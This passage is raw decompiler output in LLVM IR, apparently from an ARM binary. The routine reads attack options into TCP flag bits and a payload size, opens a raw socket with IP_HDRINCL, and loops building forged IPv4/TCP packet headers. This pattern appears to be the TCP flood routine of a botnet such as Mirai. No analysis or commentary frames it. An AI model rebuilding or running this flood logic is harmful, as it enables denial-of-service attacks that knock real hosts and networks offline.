  %v5_d024 = call i32 @function_92dc(i32 %v0_d020, i32* %v4_d024, i32 17, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d030 = load i32, i32* @r5, align 4
  store i32 %v0_d030, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_d03c = load i32, i32* @r4, align 4
  %v5_d040 = inttoptr i32 %v0_d030 to i32*
  %v6_d040 = call i32 @function_92dc(i32 %v0_d03c, i32* %v5_d040, i32 18, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d044 = load i32, i32* @r5, align 4
  store i32 %v0_d044, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d054 = load i32, i32* @r4, align 4
  %v5_d058 = inttoptr i32 %v0_d044 to i32*
  %v6_d058 = call i32 @function_92dc(i32 %v0_d054, i32* %v5_d058, i32 11, i32 0)
  %v0_d05c = load i32, i32* @r5, align 4
  store i32 %v0_d05c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d06c = load i32, i32* @r4, align 4
  %v5_d070 = inttoptr i32 %v0_d05c to i32*
  %v6_d070 = call i32 @function_92dc(i32 %v0_d06c, i32* %v5_d070, i32 12, i32 1)
  %v0_d074 = load i32, i32* @r5, align 4
  store i32 %v0_d074, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d084 = load i32, i32* @r4, align 4
  %v5_d088 = inttoptr i32 %v0_d074 to i32*
  %v6_d088 = call i32 @function_92dc(i32 %v0_d084, i32* %v5_d088, i32 13, i32 0)
  %v0_d08c = load i32, i32* @r5, align 4
  store i32 %v0_d08c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d09c = load i32, i32* @r4, align 4
  %v5_d0a0 = inttoptr i32 %v0_d08c to i32*
  %v6_d0a0 = call i32 @function_92dc(i32 %v0_d09c, i32* %v5_d0a0, i32 14, i32 0)
  %v0_d0a4 = load i32, i32* @r5, align 4
  store i32 %v0_d0a4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d0b4 = load i32, i32* @r4, align 4
  %v5_d0b8 = inttoptr i32 %v0_d0a4 to i32*
  %v6_d0b8 = call i32 @function_92dc(i32 %v0_d0b4, i32* %v5_d0b8, i32 15, i32 0)
  %v0_d0bc = load i32, i32* @r5, align 4
  store i32 %v0_d0bc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d0cc = load i32, i32* @r4, align 4
  %v5_d0d0 = inttoptr i32 %v0_d0bc to i32*
  %v6_d0d0 = call i32 @function_92dc(i32 %v0_d0cc, i32* %v5_d0d0, i32 16, i32 0)
  %v0_d0d4 = load i32, i32* @r5, align 4
  store i32 %v0_d0d4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_d0e4 = load i32, i32* @r4, align 4
  %v5_d0e8 = inttoptr i32 %v0_d0d4 to i32*
  %v6_d0e8 = call i32 @function_92dc(i32 %v0_d0e4, i32* %v5_d0e8, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_d0f8 = load i32, i32* @r5, align 4
  store i32 %v0_d0f8, i32* %r1.global-to-local, align 4
  %v0_d0fc = load i32, i32* @r4, align 4
  %v4_d100 = inttoptr i32 %v0_d0f8 to i32*
  %v5_d100 = call i32 @function_92dc(i32 %v0_d0fc, i32* %v4_d100, i32 1, i32 1)
  %v2_d10c = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_d10c, i32* %r3.global-to-local, align 4
  %v1_d110 = urem i32 %v5_d100, 256
  store i32 %v1_d110, i32* %ip.global-to-local, align 4
  %v0_d114 = load i32, i32* @r5, align 4
  store i32 %v0_d114, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_d11c = load i32, i32* @r4, align 4
  %v5_d124 = inttoptr i32 %v0_d114 to i32*
  %v6_d124 = call i32 @function_9270(i32 %v0_d11c, i32* %v5_d124, i32 25, i32 %v2_d10c, i32 %v1_d110)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_d138 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_d13c = icmp eq i32 %v3_d138, -1
  store i1 %v2_d13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d13c, label %dec_label_pc_d574, label %dec_label_pc_d148

dec_label_pc_d148:                                ; preds = %dec_label_pc_cf34
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d150 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d150, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_d164 = call i32 @setsockopt(i32 %v3_d138, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  %v2_d168 = icmp eq i32 %v7_d164, -1
  store i1 %v2_d168, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d168, label %dec_label_pc_d56c, label %dec_label_pc_d170

dec_label_pc_d170:                                ; preds = %dec_label_pc_d148
  %v0_d170 = load i32, i32* @r8, align 4
  %v0_d174 = load i32, i32* @r7, align 4
  %v0_d178 = load i32, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d180 = urem i32 %v0_d170, 65536
  store i32 %v3_d180, i32* %r2.global-to-local, align 4
  %v3_d184 = urem i32 %v0_d174, 65536
  store i32 %v3_d184, i32* %r3.global-to-local, align 4
  %v3_d188 = urem i32 %v0_d178, 65536
  store i32 %v3_d188, i32* %ip.global-to-local, align 4
  %v0_d18c = load i32, i32* @fp, align 4
  %v2_d18c = icmp eq i32 %v0_d18c, 0
  store i1 %v2_d18c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp76 = icmp slt i32 %v0_d18c, 1
  br i1 %tmp76, label %dec_label_pc_d68c, label %dec_label_pc_d1a4

dec_label_pc_d1a4:                                ; preds = %dec_label_pc_d170
  %v1_d1ac = add i32 %v6_d0e8, 40
  %tmp77 = mul i32 %v1_d1ac, 256
  %v1_d1c0 = urem i32 %v0_d174, 256
  %v1_d1c4 = and i32 %tmp77, 65280
  %v3_d1c8 = mul nuw nsw i32 %v1_d1c0, 256
  %v1_d1d0 = urem i32 %v0_d178, 256
  %tmp78 = udiv i32 %v0_d178, 256
  %v3_d1d4 = urem i32 %tmp78, 256
  %tmp79 = udiv i32 %v1_d1ac, 256
  %tmp80 = udiv i32 %v0_d174, 256
  %v4_d1dc = urem i32 %tmp80, 256
  %v5_d1dc = or i32 %v4_d1dc, %v3_d1c8
  store i32 %v5_d1dc, i32* @sl, align 4
  %v4_d1e0 = mul nuw nsw i32 %v1_d1d0, 256
  %v5_d1e0 = or i32 %v4_d1e0, %v3_d1d4
  store i32 %v5_d1e0, i32* @r6, align 4
  %tmp81 = udiv i32 %v0_d170, 256
  %v3_d1f0 = urem i32 %tmp81, 256
  %v1_d1f4 = urem i32 %v0_d170, 256
  %tmp82 = mul i32 %v5_d024, 256
  %v1_d1fc = and i32 %tmp82, 65280
  %v1_d200 = urem i32 %v6_d058, 2
  %v1_d204 = urem i32 %v6_d070, 2
  %v1_d208 = urem i32 %v6_d088, 2
  %tmp83 = udiv i32 %v5_d024, 256
  %v4_d20c = urem i32 %tmp83, 256
  %v5_d20c = or i32 %v4_d20c, %v1_d1fc
  store i32 %v5_d20c, i32* @r8, align 4
  %v1_d22c = urem i32 %v6_d0a0, 2
  %v1_d230 = urem i32 %v6_d0b8, 2
  %v1_d234 = urem i32 %v6_d0d0, 2
  %v1_d238 = urem i32 %v6_d088, 256
  %v4_d23c = mul nuw nsw i32 %v1_d1f4, 256
  %v5_d23c = or i32 %v4_d23c, %v3_d1f0
  store i32 %v5_d23c, i32* @r5, align 4
  %v3_d25026 = udiv i32 %v1_d1c4, 256
  store i32 %v3_d25026, i32* %r3.global-to-local, align 4
  store i32 %v1_d1f4, i32* %ip.global-to-local, align 4
  store i32 %v1_d1c0, i32* %r1.global-to-local, align 4
  store i32 %v1_d1d0, i32* %r2.global-to-local, align 4
  %v5_d26c = trunc i32 %v0_d174 to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext9 = mul i32 %v5_cfa8, 16777216
  %v4_d2c8 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %v0_d170, 16777216
  %v4_d2d4 = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %tmp79, 16777216
  %v4_d2e8 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v1_d1ac, 16777216
  %v4_d2ec = sdiv i32 %sext12, 16777216
  %tmp = sub nsw i32 0, %v1_d200
  %v4_d33c = and i32 %tmp, 32
  %tmp94 = sub nsw i32 0, %v1_d204
  %v4_d350 = and i32 %tmp94, 16
  %tmp95 = sub nsw i32 0, %v1_d208
  %v4_d364 = and i32 %tmp95, 8
  %tmp96 = sub nsw i32 0, %v1_d22c
  %v4_d378 = and i32 %tmp96, 4
  %tmp97 = sub nsw i32 0, %v1_d230
  %v3_d38c = and i32 %tmp97, 2
  %sext13 = mul i32 %v0_d178, 16777216
  %v7_d3bc = sdiv i32 %sext13, 16777216
  %v1_d2d0 = trunc i32 %v4_d2c8 to i8
  %extract.t = trunc i32 %v4_d2d4 to i8
  %v3_d3bc = sext i8 %v5_d26c to i32
  %v2_d3e0 = icmp eq i32 %v1_d238, 0
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %bb90, %dec_label_pc_d1a4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d284 = call i32* @calloc(i32 1510, i32 1)
  %v4_d284 = ptrtoint i32* %v2_d284 to i32
  store i32 %v4_cf54, i32* %ip.global-to-local, align 4
  %v2_d290 = load i32, i32* %r4.global-to-local, align 4
  %v5_d290 = mul i32 %v2_d290, 4
  %v6_d290 = add i32 %v5_d290, %v4_cf54
  %v7_d290 = inttoptr i32 %v6_d290 to i32*
  store i32 %v4_d284, i32* %v7_d290, align 4
  %v3_d294 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d294, i32* %r3.global-to-local, align 4
  %v0_d298 = load i32, i32* %ip.global-to-local, align 4
  %v4_d298 = mul i32 %v3_d294, 4
  %v5_d298 = add i32 %v0_d298, %v4_d298
  %v6_d298 = inttoptr i32 %v5_d298 to i32*
  %v7_d298 = load i32, i32* %v6_d298, align 4
  store i32 %v7_d298, i32* @r7, align 4
  %v1_d29c = inttoptr i32 %v7_d298 to i8*
  %v2_d29c = load i8, i8* %v1_d29c, align 1
  %tmp98 = urem i8 %v2_d29c, 16
  %v1_d2a0 = zext i8 %tmp98 to i32
  %v1_d2a4 = or i32 %v1_d2a0, 64
  store i32 %v1_d2a4, i32* %r2.global-to-local, align 4
  %v1_d2a8 = trunc i32 %v1_d2a4 to i8
  store i8 %v1_d2a8, i8* %v1_d29c, align 1
  %v0_d2ac = load i32, i32* @r7, align 4
  %v1_d2ac = inttoptr i32 %v0_d2ac to i8*
  %v2_d2ac = load i8, i8* %v1_d2ac, align 1
  %v1_d2b0 = and i8 %v2_d2ac, -16
  %v1_d2b4 = or i8 %v1_d2b0, 5
  store i32 %v1_cfd4, i32* %r1.global-to-local, align 4
  store i8 %v1_d2b4, i8* %v1_d2ac, align 1
  %v2_d2c4 = load i32, i32* @r7, align 4
  %v3_d2c4 = add i32 %v2_d2c4, 1
  %v4_d2c4 = inttoptr i32 %v3_d2c4 to i8*
  store i8 %v5_cf8c, i8* %v4_d2c4, align 1
  store i32 %v4_d2c8, i32* %r3.global-to-local, align 4
  %v0_d2cc = load i32, i32* %r1.global-to-local, align 4
  %v2_d2cc = icmp eq i32 %v0_d2cc, 0
  store i1 %v2_d2cc, i1* %cpsr_z.global-to-local, align 1
  %v2_d2d0 = load i32, i32* @r7, align 4
  %v3_d2d0 = add i32 %v2_d2d0, 8
  %v4_d2d0 = inttoptr i32 %v3_d2d0 to i8*
  store i8 %v1_d2d0, i8* %v4_d2d0, align 1
  store i32 %v4_d2d4, i32* %r2.global-to-local, align 4
  %v0_d2d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d2d8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d278
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d2dc = load i32, i32* @r7, align 4
  %v4_d2dc = add i32 %v3_d2dc, 6
  %v5_d2dc = inttoptr i32 %v4_d2dc to i8*
  store i8 64, i8* %v5_d2dc, align 1
  %v0_d2e4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_d2e4.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d278, %bb
  %v0_d2e4.off0 = phi i8 [ %extract.t, %dec_label_pc_d278 ], [ %extract.t27, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_d2e4 = load i32, i32* @r7, align 4
  %v3_d2e4 = add i32 %v2_d2e4, 5
  %v4_d2e4 = inttoptr i32 %v3_d2e4 to i8*
  store i8 %v0_d2e4.off0, i8* %v4_d2e4, align 1
  store i32 %v4_d2e8, i32* %ip.global-to-local, align 4
  store i32 %v4_d2ec, i32* %r1.global-to-local, align 4
  %v0_d2f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d2f0, label %bb85, label %bb84

bb84:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %bb84
  %v0_d2f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d2f4 = trunc i32 %v0_d2f4 to i8
  %v2_d2f4 = load i32, i32* @r7, align 4
  %v3_d2f4 = add i32 %v2_d2f4, 9
  %v4_d2f4 = inttoptr i32 %v3_d2f4 to i8*
  store i8 %v1_d2f4, i8* %v4_d2f4, align 1
  %v0_d2f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d2f8, label %bb87, label %bb86

bb86:                                             ; preds = %bb85
  %v1_d2f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_d2f8 = trunc i32 %v1_d2f8 to i8
  %v3_d2f8 = load i32, i32* @r7, align 4
  %v4_d2f8 = add i32 %v3_d2f8, 7
  %v5_d2f8 = inttoptr i32 %v4_d2f8 to i8*
  store i8 %v2_d2f8, i8* %v5_d2f8, align 1
  br label %bb87

bb87:                                             ; preds = %bb85, %bb86
  %v3_d2fc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d2fc, i32* %r2.global-to-local, align 4
  %v0_d300 = load i32, i32* %ip.global-to-local, align 4
  %v1_d300 = trunc i32 %v0_d300 to i8
  %v2_d300 = load i32, i32* @r7, align 4
  %v3_d300 = add i32 %v2_d300, 2
  %v4_d300 = inttoptr i32 %v3_d300 to i8*
  store i8 %v1_d300, i8* %v4_d300, align 1
  store i32 %v6_d124, i32* %ip.global-to-local, align 4
  %v0_d308 = load i32, i32* %r2.global-to-local, align 4
  %v3_d308 = mul i32 %v0_d308, 32
  store i32 %v3_d308, i32* %r3.global-to-local, align 4
  %v1_d30c = load i32, i32* @r7, align 4
  %v2_d30c = add i32 %v1_d30c, 12
  %v3_d30c = inttoptr i32 %v2_d30c to i32*
  store i32 %v6_d124, i32* %v3_d30c, align 4
  %v0_d310 = load i32, i32* %r3.global-to-local, align 4
  %v1_d310 = load i32, i32* %r2.global-to-local, align 4
  %tmp99 = mul i32 %v1_d310, -8
  %v5_d310 = add i32 %v0_d310, %tmp99
  %v1_d314 = load i32, i32* @sb, align 4
  %v2_d314 = add i32 %v1_d314, %v5_d310
  store i32 %v2_d314, i32* %r3.global-to-local, align 4
  %v1_d318 = add i32 %v2_d314, 16
  %v2_d318 = inttoptr i32 %v1_d318 to i32*
  %v3_d318 = load i32, i32* %v2_d318, align 4
  store i32 %v3_d318, i32* %r2.global-to-local, align 4
  %v0_d31c = load i32, i32* %r1.global-to-local, align 4
  %v1_d31c = trunc i32 %v0_d31c to i8
  %v2_d31c = load i32, i32* @r7, align 4
  %v3_d31c = add i32 %v2_d31c, 3
  %v4_d31c = inttoptr i32 %v3_d31c to i8*
  store i8 %v1_d31c, i8* %v4_d31c, align 1
  %v0_d320 = load i32, i32* @r5, align 4
  %v1_d320 = trunc i32 %v0_d320 to i8
  %v2_d320 = load i32, i32* @r7, align 4
  %v3_d320 = add i32 %v2_d320, 4
  %v4_d320 = inttoptr i32 %v3_d320 to i8*
  store i8 %v1_d320, i8* %v4_d320, align 1
  %v0_d324 = load i32, i32* %r2.global-to-local, align 4
  %v1_d324 = load i32, i32* @r7, align 4
  %v2_d324 = add i32 %v1_d324, 16
  %v3_d324 = inttoptr i32 %v2_d324 to i32*
  store i32 %v0_d324, i32* %v3_d324, align 4
  %v0_d328 = load i32, i32* @sl, align 4
  %v1_d328 = trunc i32 %v0_d328 to i8
  %v2_d328 = load i32, i32* @r7, align 4
  %v3_d328 = add i32 %v2_d328, 20
  %v4_d328 = inttoptr i32 %v3_d328 to i8*
  store i8 %v1_d328, i8* %v4_d328, align 1
  %v0_d32c = load i32, i32* @r7, align 4
  %v1_d32c = add i32 %v0_d32c, 20
  store i32 %v1_d32c, i32* @r4, align 4
  %v1_d330 = add i32 %v0_d32c, 33
  %v2_d330 = inttoptr i32 %v1_d330 to i8*
  %v3_d330 = load i8, i8* %v2_d330, align 1
  %v4_d330 = zext i8 %v3_d330 to i32
  store i32 %v1_d200, i32* %r1.global-to-local, align 4
  %v1_d338 = and i32 %v4_d330, 223
  %v5_d33c = or i32 %v1_d338, %v4_d33c
  store i32 %v5_d33c, i32* %r3.global-to-local, align 4
  %v1_d340 = trunc i32 %v5_d33c to i8
  store i8 %v1_d340, i8* %v2_d330, align 1
  %v0_d344 = load i32, i32* @r4, align 4
  %v1_d344 = add i32 %v0_d344, 13
  %v2_d344 = inttoptr i32 %v1_d344 to i8*
  %v3_d344 = load i8, i8* %v2_d344, align 1
  %v4_d344 = zext i8 %v3_d344 to i32
  store i32 %v1_d204, i32* %r3.global-to-local, align 4
  %v1_d34c = and i32 %v4_d344, 239
  %v5_d350 = or i32 %v1_d34c, %v4_d350
  store i32 %v5_d350, i32* %r2.global-to-local, align 4
  %v1_d354 = trunc i32 %v5_d350 to i8
  store i8 %v1_d354, i8* %v2_d344, align 1
  %v0_d358 = load i32, i32* @r4, align 4
  %v1_d358 = add i32 %v0_d358, 13
  %v2_d358 = inttoptr i32 %v1_d358 to i8*
  %v3_d358 = load i8, i8* %v2_d358, align 1
  %v4_d358 = zext i8 %v3_d358 to i32
  store i32 %v1_d208, i32* %ip.global-to-local, align 4
  %v1_d360 = and i32 %v4_d358, 247
  %v5_d364 = or i32 %v1_d360, %v4_d364
  store i32 %v5_d364, i32* %r3.global-to-local, align 4
  %v1_d368 = trunc i32 %v5_d364 to i8
  store i8 %v1_d368, i8* %v2_d358, align 1
  %v0_d36c = load i32, i32* @r4, align 4
  %v1_d36c = add i32 %v0_d36c, 13
  %v2_d36c = inttoptr i32 %v1_d36c to i8*
  %v3_d36c = load i8, i8* %v2_d36c, align 1
  %v4_d36c = zext i8 %v3_d36c to i32
  store i32 %v1_d22c, i32* %r1.global-to-local, align 4
  %v1_d374 = and i32 %v4_d36c, 251
  %v5_d378 = or i32 %v1_d374, %v4_d378
  store i32 %v5_d378, i32* %r2.global-to-local, align 4
  %v1_d37c = trunc i32 %v5_d378 to i8
  store i8 %v1_d37c, i8* %v2_d36c, align 1
  %v0_d380 = load i32, i32* @r4, align 4
  %v1_d380 = add i32 %v0_d380, 13
  %v2_d380 = inttoptr i32 %v1_d380 to i8*
  %v3_d380 = load i8, i8* %v2_d380, align 1
  %v4_d380 = zext i8 %v3_d380 to i32
  store i32 %v1_d230, i32* %r2.global-to-local, align 4
  %v1_d388 = and i32 %v4_d380, 253
  %v4_d38c = or i32 %v1_d388, %v3_d38c
  store i32 %v4_d38c, i32* %r3.global-to-local, align 4
  %v1_d390 = trunc i32 %v4_d38c to i8
  store i8 %v1_d390, i8* %v2_d380, align 1
  %v0_d394 = load i32, i32* @r4, align 4
  %v1_d394 = add i32 %v0_d394, 12
  %v2_d394 = inttoptr i32 %v1_d394 to i8*
  %v3_d394 = load i8, i8* %v2_d394, align 1
  %v4_d394 = zext i8 %v3_d394 to i32
  store i32 %v4_d394, i32* %r2.global-to-local, align 4
  %v1_d398 = add i32 %v0_d394, 13
  %v2_d398 = inttoptr i32 %v1_d398 to i8*
  %v3_d398 = load i8, i8* %v2_d398, align 1
  %v4_d398 = zext i8 %v3_d398 to i32
  store i32 %v1_d234, i32* %ip.global-to-local, align 4
  %tmp100 = urem i8 %v3_d394, 16
  %v1_d3a0 = zext i8 %tmp100 to i32
  %v1_d3a4 = and i32 %v4_d398, 254
  %v2_d3a8 = or i32 %v1_d3a4, %v1_d234
  store i32 %v2_d3a8, i32* %r3.global-to-local, align 4
  %v1_d3ac = or i32 %v1_d3a0, 80
  store i32 %v1_d3ac, i32* %r2.global-to-local, align 4
  %v1_d3b0 = trunc i32 %v2_d3a8 to i8
  store i8 %v1_d3b0, i8* %v2_d398, align 1
  %v0_d3b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3b4 = trunc i32 %v0_d3b4 to i8
  %v2_d3b4 = load i32, i32* @r4, align 4
  %v3_d3b4 = add i32 %v2_d3b4, 12
  %v4_d3b4 = inttoptr i32 %v3_d3b4 to i8*
  store i8 %v1_d3b4, i8* %v4_d3b4, align 1
  store i32 %v3_d3bc, i32* %r1.global-to-local, align 4
  store i32 %v7_d3bc, i32* %r2.global-to-local, align 4
  %v2_d3c0 = load i32, i32* @r4, align 4
  %v3_d3c0 = add i32 %v2_d3c0, 1
  %v4_d3c0 = inttoptr i32 %v3_d3c0 to i8*
  store i8 %v5_d26c, i8* %v4_d3c0, align 1
  %v0_d3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3c4 = trunc i32 %v0_d3c4 to i8
  %v2_d3c4 = load i32, i32* @r4, align 4
  %v3_d3c4 = add i32 %v2_d3c4, 3
  %v4_d3c4 = inttoptr i32 %v3_d3c4 to i8*
  store i8 %v1_d3c4, i8* %v4_d3c4, align 1
  %v0_d3c8 = load i32, i32* @r6, align 4
  %v1_d3c8 = trunc i32 %v0_d3c8 to i8
  %v2_d3c8 = load i32, i32* @r4, align 4
  %v3_d3c8 = add i32 %v2_d3c8, 2
  %v4_d3c8 = inttoptr i32 %v3_d3c8 to i8*
  store i8 %v1_d3c8, i8* %v4_d3c8, align 1
  %v0_d3cc = load i32, i32* @r8, align 4
  %v1_d3cc = load i32, i32* @r4, align 4
  %v2_d3cc = add i32 %v1_d3cc, 4
  %v3_d3cc = inttoptr i32 %v2_d3cc to i32*
  store i32 %v0_d3cc, i32* %v3_d3cc, align 4
  %v0_d3d0 = call i32 @function_f67c()
  store i32 %v1_d238, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_d3d0, 16777216
  %v1_d3d8 = sdiv i32 %sext, 16777216
  store i32 %v1_d3d8, i32* %r2.global-to-local, align 4
  %v3_d3dc = ashr i32 %sext, 31
  store i32 %v3_d3dc, i32* %r3.global-to-local, align 4
  store i1 %v2_d3e0, i1* %cpsr_z.global-to-local, align 1
  %v1_d3e4 = trunc i32 %v3_d3dc to i8
  %v2_d3e4 = load i32, i32* @r4, align 4
  %v3_d3e4 = add i32 %v2_d3e4, 15
  %v4_d3e4 = inttoptr i32 %v3_d3e4 to i8*
  store i8 %v1_d3e4, i8* %v4_d3e4, align 1
  %v0_d3e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_d3f4.pre = load i32, i32* @r4, align 4
  br i1 %v0_d3e8, label %.thread14, label %bb88

bb88:                                             ; preds = %bb87
  %v2_d3e8 = add i32 %v2_d3f4.pre, 13
  %v3_d3e8 = inttoptr i32 %v2_d3e8 to i8*
  %v4_d3e8 = load i8, i8* %v3_d3e8, align 1
  %v5_d3e8 = zext i8 %v4_d3e8 to i32
  %v2_d3ec = or i32 %v5_d3e8, 8
  store i32 %v2_d3ec, i32* %r3.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb87, %bb88
  store i32 %v6_d0e8, i32* @r1, align 4
  %v0_d3f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3f4 = trunc i32 %v0_d3f4 to i8
  %v3_d3f4 = add i32 %v2_d3f4.pre, 14
  %v4_d3f4 = inttoptr i32 %v3_d3f4 to i8*
  store i8 %v1_d3f4, i8* %v4_d3f4, align 1
  %v0_d3f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3f8, label %bb90, label %bb89

bb89:                                             ; preds = %.thread14
  %v1_d3f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d3f8 = trunc i32 %v1_d3f8 to i8
  %v3_d3f8 = load i32, i32* @r4, align 4
  %v4_d3f8 = add i32 %v3_d3f8, 13
  %v5_d3f8 = inttoptr i32 %v4_d3f8 to i8*
  store i8 %v2_d3f8, i8* %v5_d3f8, align 1
  br label %bb90

bb90:                                             ; preds = %.thread14, %bb89
  %v0_d3fc = load i32, i32* @r7, align 4
  %v1_d3fc = add i32 %v0_d3fc, 40
  %v1_d400 = inttoptr i32 %v1_d3fc to i8*
  %v2_d400 = call i32 @function_f7fc(i8* %v1_d400)
  %v3_d404 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d404, i32* %r3.global-to-local, align 4
  %v1_d408 = add i32 %v3_d404, 1
  store i32 %v1_d408, i32* %r4.global-to-local, align 4
  %v0_d40c = load i32, i32* @fp, align 4
  %v9_d40c = icmp eq i32 %v0_d40c, %v1_d408
  store i1 %v9_d40c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d408, i32* %stack_var_-40, align 4
  %v8_d414 = icmp sgt i32 %v0_d40c, %v1_d408
  br i1 %v8_d414, label %dec_label_pc_d278, label %dec_label_pc_d418

dec_label_pc_d418:                                ; preds = %bb90
  store i32 %v6_d0e8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d420.preheader

dec_label_pc_d420.preheader:                      ; preds = %dec_label_pc_d418, %dec_label_pc_d68c
  %v0_d42018 = phi i32 [ %v0_d40c, %dec_label_pc_d418 ], [ %v0_d18c, %dec_label_pc_d68c ]
  %stack_var_-168.0.ph = phi i32 [ %v1_d1ac, %dec_label_pc_d418 ], [ %v1_d694, %dec_label_pc_d68c ]
  %storemerge = add i32 %v6_d0e8, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_d5d8 = icmp eq i32 %v6_d124, -1
  %v9_d5f4 = icmp eq i32 %v3_d180, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_d670 = icmp eq i32 %v1_d110, 0
  br label %dec_label_pc_d420

dec_label_pc_d420:                                ; preds = %dec_label_pc_d4c8, %dec_label_pc_d420.preheader
  %v0_d420 = phi i32 [ %v0_d42018, %dec_label_pc_d420.preheader ], [ %v0_d55c, %dec_label_pc_d4c8 ]
  %v2_d420 = icmp eq i32 %v0_d420, 0
  store i1 %v2_d420, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp91 = icmp slt i32 %v0_d420, 1
  br label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d428, %dec_label_pc_d420
  br i1 %tmp91, label %dec_label_pc_d428, label %dec_label_pc_d42c

dec_label_pc_d42c:                                ; preds = %dec_label_pc_d428
  %v0_d42c = load i32, i32* @r8, align 4
  %v3_d42c = mul i32 %v0_d42c, 65536
  store i32 %v3_d42c, i32* %r2.global-to-local, align 4
  %tmp92 = mul i32 %v0_d42c, 256
  %v1_d434 = and i32 %tmp92, 65280
  store i32 %v1_d434, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp93 = udiv i32 %v0_d42c, 256
  %v4_d440 = urem i32 %tmp93, 256
  %v5_d440 = or i32 %v4_d440, %v1_d434
  store i32 %v5_d440, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d4c8, %dec_label_pc_d42c
  %v1_d45c = phi i32 [ %v1_d558, %dec_label_pc_d4c8 ], [ 0, %dec_label_pc_d42c ]
  %v5_d44c = mul i32 %v1_d45c, 24
  %v1_d450 = load i32, i32* @sb, align 4
  %v2_d450 = add i32 %v1_d450, %v5_d44c
  store i32 %v2_d450, i32* %r3.global-to-local, align 4
  store i32 %v4_cf54, i32* %ip.global-to-local, align 4
  %v1_d458 = add i32 %v2_d450, 20
  %v2_d458 = inttoptr i32 %v1_d458 to i8*
  %v3_d458 = load i8, i8* %v2_d458, align 1
  %v4_d458 = zext i8 %v3_d458 to i32
  store i32 %v4_d458, i32* %r2.global-to-local, align 4
  %v4_d45c = mul i32 %v1_d45c, 4
  %v5_d45c = add i32 %v4_d45c, %v4_cf54
  %v6_d45c = inttoptr i32 %v5_d45c to i32*
  %v7_d45c = load i32, i32* %v6_d45c, align 4
